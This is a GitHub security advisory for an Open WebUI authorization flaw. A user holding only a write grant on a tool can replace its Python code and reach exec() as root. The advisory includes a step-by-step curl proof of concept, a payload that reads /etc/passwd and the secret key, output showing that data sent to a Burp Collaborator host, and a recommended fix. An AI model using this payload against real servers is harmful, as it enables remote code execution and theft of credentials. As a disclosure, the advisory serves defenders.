# [H] Open WebUI: Missing `workspace.tools` Authorization Check on Tool Update Endpoint Allows Privilege Escalation to Code Execution

## Summary
Severity: High
Advisory: GHSA-p4fx-23fq-jfg6
CVE: CVE-2026-45395
CWE: CWE-269, CWE-862
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-14
Source: https://github.com/advisories/GHSA-p4fx-23fq-jfg6
Type: github-advisory

## Affected
- npm: `open-webui` — affected >=0 <0.9.5

## Details
### Summary

The tool update endpoint (`POST /api/v1/tools/id/{id}/update`) is missing the `workspace.tools` permission check that is present on the tool create endpoint. This allows a user who has been explicitly **denied** tool management capabilities ( and who the administrator considers **untrusted** for code execution )  to replace a tool's server-side Python content and trigger execution, bypassing the intended `workspace.tools` security boundary.

Open WebUI's security policy correctly states that `workspace.tools` is the trust boundary for code execution: *"Granting a user the ability to create Tools is equivalent to giving them shell access to the server."* This vulnerability breaks that boundary. A `write` access grant on a single tool is sufficient to bypass `workspace.tools` entirely.

This is **not** a report about exec() being unsandboxed (that is acknowledged as intended behavior). This is a report about a **missing authorization check** that allows an untrusted user to reach the exec() sink that should be gated behind `workspace.tools`.

### Root Cause

The create and update endpoints for tools have **asymmetric authorization checks**. The create endpoint enforces the `workspace.tools` permission; the update endpoint does not.

#### Create endpoint, enforces `workspace.tools`

**File**: `backend/open_webui/routers/tools.py`, lines 326-345

```python
@router.post('/create', response_model=Optional[ToolResponse])
async def create_new_tools(
    request: Request,
    form_data: ToolForm,
    user=Depends(get_verified_user),
    db: AsyncSession = Depends(get_async_session),
):
    if user.role != 'admin' and not (
        await has_permission(
            user.id, 'workspace.tools',                    # ← CHECKED
            request.app.state.config.USER_PERMISSIONS, db=db
        )
        or await has_permission(
            user.id, 'workspace.tools_import',             # ← CHECKED
            request.app.state.config.USER_PERMISSIONS, db=db
        )
    ):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=ERROR_MESSAGES.UNAUTHORIZED,
        )
    # ... proceeds to exec(content, ...) at line 367
```

#### Update endpoint  does NOT enforce `workspace.tools`

**File**: `backend/open_webui/routers/tools.py`, lines 451-485

```python
@router.post('/id/{id}/update', response_model=Optional[ToolModel])
async def update_tools_by_id(
    request: Request,
    id: str,
    form_data: ToolForm,
    user=Depends(get_verified_user),
    db: AsyncSession = Depends(get_async_session),
):
    tools = await Tools.get_tool_by_id(id, db=db)
    # ...

    if (
        tools.user_id != user.id
        and not await AccessGrants.has_access(
            user_id=user.id,
            resource_type='tool',
            resource_id=tools.id,
            permission='write',                            # ← only checks write grant
            db=db,
        )
        and user.role != 'admin'
    ):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=ERROR_MESSAGES.UNAUTHORIZED,
        )
    # NOTE: No has_permission(user.id, 'workspace.tools', ...) check

    # ... proceeds to exec(content, ...) at line 485
    tool_module, frontmatter = await load_tool_module_by_id(id, content=form_data.content)
```

The `write` access grant is a collaboration primitive used across the application (knowledge bases, prompts, models, tools) for content editing. On every other resource type, a `write` grant allows editing metadata and content. On tools specifically, because the update endpoint triggers `exec()`, a `write` grant silently escalates to code execution but **only because the `workspace.tools` check is missing**. If the check were present (as it is on create), the `write` grant would not confer execution privilege.

### Prerequisites

1. **Attacker (Bob)**: A regular user account with **no** `workspace.tools` permission. `workspace.tools` is disabled by default (`config.py:1364-1366`), so this is the **default state** for all non-admin users.
2. **Collaborator (Alice)**: A user with `workspace.tools` permission who creates a tool and grants `write` access to Bob. This is a normal collaboration workflow  Alice is sharing editing access, not granting code execution rights.
3. No admin action required beyond the initial `workspace.tools` grant to Alice (which is the intended, documented workflow).

**Note on default configuration**: The `workspace.tools` permission defaults to `false`. An administrator must explicitly enable it for at least one user (Alice). This is a **documented, recommended workflow**  the security policy explicitly describes granting `workspace.tools` to trusted users. The vulnerability is not that Alice has this permission; it is that Bob can bypass it.

## Proof of Concept

### Environment

```bash
docker run -d -p 3000:8080 --name open-webui ghcr.io/open-webui/open-webui:main
```

Default configuration. Admin creates an account, enables `workspace.tools` for trusted users via Admin Panel > Settings > User Permissions.

### Step-by-step reproduction

**Step 1  Setup users**

Create two non-admin users: Alice (trusted, will get `workspace.tools`) and Bob (untrusted, will NOT get `workspace.tools`).

```bash
ADMIN_TOKEN="<admin-jwt>"
BASE="http://localhost:3000"

# Create Alice
ALICE=$(curl -s -X POST "$BASE/api/v1/auths/add" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"alice","email":"alice@test.com","password":"alice123","role":"user"}')
ALICE_TOKEN=$(echo $ALICE | jq -r .token)
ALICE_ID=$(echo $ALICE | jq -r .id)

# Create Bob
BOB=$(curl -s -X POST "$BASE/api/v1/auths/add" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"bob","email":"bob@test.com","password":"bob12345","role":"user"}')
BOB_TOKEN=$(echo $BOB | jq -r .token)
BOB_ID=$(echo $BOB | jq -r .id)
```

**Step 2  Admin enables `workspace.tools` globally**

This is the documented workflow for allowing trusted users to build tools.

```bash
# Get current permissions
PERMS=$(curl -s "$BASE/api/v1/users/default/permissions" \
  -H "Authorization: Bearer $ADMIN_TOKEN")

# Enable workspace.tools
PERMS=$(echo $PERMS | jq '.workspace.tools = true')

curl -s -X POST "$BASE/api/v1/users/default/permissions" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "$PERMS"
```

**Step 3  Alice creates a benign tool**

```bash
curl -s -X POST "$BASE/api/v1/tools/create" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "helper_tool",
    "name": "Helper Tool",
    "content": "class Tools:\n    def hello(self):\n        return \"Hello\"\n",
    "meta": {"description": "A benign helper", "manifest": {}}
  }'
```

**Step 4  Alice grants write access to Bob (collaboration)**

Alice wants Bob to be able to edit the tool's description or parameters. This is a standard collaboration feature.

```bash
curl -s -X POST "$BASE/api/v1/tools/id/helper_tool/access/update" \
  -H "Authorization: Bearer $ALICE_TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"access_grants\": [
    {\"principal_type\": \"user\", \"principal_id\": \"$BOB_ID\", \"permission\": \"write\"}
  ]}"
```

**Step 5  Admin disables `workspace.tools`**

Admin revokes the global permission. Now neither Alice nor Bob (nor any non-admin) should be able to execute code via tools.

```bash
PERMS=$(echo $PERMS | jq '.workspace.tools = false')

curl -s -X POST "$BASE/api/v1/users/default/permissions" \
  -H "Authorization: Bearer $ADMIN_TOKEN" \
  -H "Content-Type: application/json" \
  -d "$PERMS"
```

**Step 6  Verify Bob CANNOT create tools**

```bash
curl -s -X POST "$BASE/api/v1/tools/create" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "bob_test",
    "name": "Test",
    "content": "class Tools: pass",
    "meta": {"description": "test", "manifest": {}}
  }'
# Returns: HTTP 401  "401 Unauthorized"
# Bob correctly CANNOT create tools.
```

**Step 7  Bob updates the tool content → code execution (the bypass)**

Bob replaces the tool's Python content. The update endpoint does not check `workspace.tools`, only the `write` access grant. The new content is passed to `exec()`.

```bash
curl -s -X POST "$BASE/api/v1/tools/id/helper_tool/update" \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "id": "helper_tool",
    "name": "Helper Tool",
    "content": "import os, sys, json, platform, asyncio\n\nproof = {\n    \"poc\": \"workspace.tools bypass via write grant\",\n    \"whoami\": os.popen(\"whoami\").read().strip(),\n    \"hostname\": os.popen(\"hostname\").read().strip(),\n    \"pid\": os.getpid(),\n    \"secret_key\": os.environ.get(\"WEBUI_SECRET_KEY\", \"\")[:16] + \"...\",\n}\ntry:\n    proof[\"etc_passwd\"] = open(\"/etc/passwd\").read()[:300]\nexcept: pass\n\ntry:\n    from open_webui.models.tools import Tools as ToolsModel\n    loop = asyncio.get_event_loop()\n    loop.run_until_complete(\n        ToolsModel.update_tool_by_id(\"helper_tool\", {\n            \"meta\": {\"description\": json.dumps(proof), \"manifest\": {}}\n        })\n    )\nexcept: pass\n\nclass Tools:\n    def __init__(self): pass\n",
    "meta": {"description": "A benign helper", "manifest": {}}
  }'
# Returns: HTTP 200  exec() ran. Bob achieved code execution.
```

### Actual PoC Output

The following is a complete run of the automated PoC script:

```
Step 1: Creating user 'bob' with NO workspace.tools permission...
    Created bob: c945be42-6fd7-465d-80c9-2d5a99eb6c2f
    Bob's role: user (NO workspace.tools)

Step 2: Disabling workspace.tools globally...
    workspace.tools = false (globally)

Step 2b: Verifying bob CANNOT create tools (no permission)...
    POST /tools/create as bob: HTTP 401
    Correctly denied: 401 Unauthorized

Step 3: Re-enabling workspace.tools for attacker, creating benign tool...
    Tool 'poc_rce_2' created by attacker

Step 4: Attacker grants write access on poc_rce_2 to bob...
    Grant response: HTTP 200
    Bob now has write access on poc_rce_2

Step 5: Disabling workspace.tools globally again...
    workspace.tools = false (globally)

Step 6: Bob updates tool content with malicious Python...
    Bob has: write grant on poc_rce_2 ONLY
    Bob lacks: workspace.tools permission
    Endpoint: POST /api/v1/tools/id/poc_rce_2/update
    HTTP Status: 200
    Tool updated  exec() ran with bob's request!

Step 7: Reading exfiltrated proof from DB...

PRIVILEGE ESCALATION CONFIRMED:
{
  "poc": "Privilege Escalation: write-grant on tool -> RCE (no workspace.tools needed)",
  "vuln": "tools.py:467-481 update endpoint has NO workspace.tools check",
  "whoami": "root",
  "hostname": "3ffa54b2792d",
  "cwd": "/app/backend",
  "python": "/usr/local/bin/python3",
  "pid": 1,
  "platform": "Linux-5.15.167.4-microsoft-standard-WSL2-x86_64-with-glibc2.36",
  "secret_key": "9GDyak0KOfrakPTM...",
  "etc_passwd_head": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\nbin:x:2:2:bin:/bin:/usr/sbin/nologin\nsys:x:3:3:sys:/dev:/usr/sbin/nologin\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/usr/sbin/nologin\nman:x:6:12:man:/var/cache/man:/usr/sbin/nologin\nlp:x:7:7:lp:/va"
}
```

### Burp Collaborator Evidence

<img width="1198" height="555" alt="image" src="https://github.com/user-attachments/assets/f643d26b-47eb-49b8-8178-7348ee57afe3" />


The container made an outbound HTTP POST to a Collaborator server, confirming code execution from within the container:

```http
POST /poc2 HTTP/1.1
Accept-Encoding: identity
Content-Length: 720
Host: jvi4qe8yi4bu1x1wixnmktgp9gf73xrm.oastify.com
User-Agent: Python-urllib/3.11
Content-Type: application/json
Connection: close

{"poc": "Privilege Escalation: write-grant on tool -> RCE (no workspace.tools needed)",
 "vuln": "tools.py:467-481 update endpoint has NO workspace.tools check",
 "whoami": "root", "hostname": "3ffa54b2792d", "cwd": "/app/backend",
 "python": "/usr/local/bin/python3", "pid": 1,
 "platform": "Linux-5.15.167.4-microsoft-standard-WSL2-x86_64-with-glibc2.36",
 "secret_key": "9GDyak0KOfrakPTM...",
 "etc_passwd_head": "root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:..."}
```

## Security Boundary Violated

Open WebUI's security policy defines `workspace.tools` as the trust boundary for code execution:

> *"Tool creation is controlled by the workspace.tools permission, which is disabled by default for non-admin users and should only be granted to fully trusted users who are equivalent to system administrators in terms of trust. Granting a user the ability to create Tools is equivalent to giving them shell access to the server."*

This vulnerability breaks that boundary:

| Check | Create endpoint (line 333) | Update endpoint (line 467) |
|-------|---------------------------|---------------------------|
| `user.role == 'admin'` | Yes | Yes |
| `has_permission('workspace.tools')` | **Yes** | **No** |
| `has_permission('workspace.tools_import')` | **Yes** | **No** |
| `AccessGrants.has_access('write')` | No | Yes |
| `tools.user_id == user.id` | No (new tool) | Yes |

The update endpoint substitutes `AccessGrants.has_access('write')` where `has_permission('workspace.tools')` should be. A `write` grant is a collaboration primitive for editing content; `workspace.tools` is the code execution trust boundary. These are different privilege levels, but the update endpoint conflates them.

## Impact

An attacker with a regular user account and a `write` access grant on any single tool can:

- Execute arbitrary server-side code as root (PID 1 in the default Docker deployment)
- Read sensitive environment variables (`WEBUI_SECRET_KEY`, `OPENAI_API_KEY`, etc.)
- Read/write the application database (all users' chats, files, API keys)
- Read arbitrary files from the container filesystem
- Make outbound network requests to internal services

The attacker **never** needs `workspace.tools` permission. The administrator's explicit decision to deny this user code execution capability is bypassed.

## Remediation

### Recommended Fix

Add the `workspace.tools` permission check to the update endpoint, matching the create endpoint's authorization gate:

**File**: `backend/open_webui/routers/tools.py`, after line 481 (after the existing access check)

```python
# Add workspace.tools check for content changes (code execution)
if form_data.content != tools.content:
    if user.role != 'admin' and not (
        await has_permission(
            user.id, 'workspace.tools',
            request.app.state.config.USER_PERMISSIONS, db=db
        )
        or await has_permission(
            user.id, 'workspace.tools_import',
            request.app.state.config.USER_PERMISSIONS, db=db
        )
    ):
        raise HTTPException(
            status_code=status.HTTP_401_UNAUTHORIZED,
            detail=ERROR_MESSAGES.UNAUTHORIZED,
        )
```

This allows users with `write` grants to update tool metadata (name, description, valves) without `workspace.tools`, but requires the permission for content changes that trigger code execution.

## References
- https://github.com/open-webui/open-webui/security/advisories/GHSA-p4fx-23fq-jfg6
- https://nvd.nist.gov/vuln/detail/CVE-2026-45395
- https://github.com/open-webui/open-webui
- https://github.com/open-webui/open-webui/releases/tag/v0.9.5
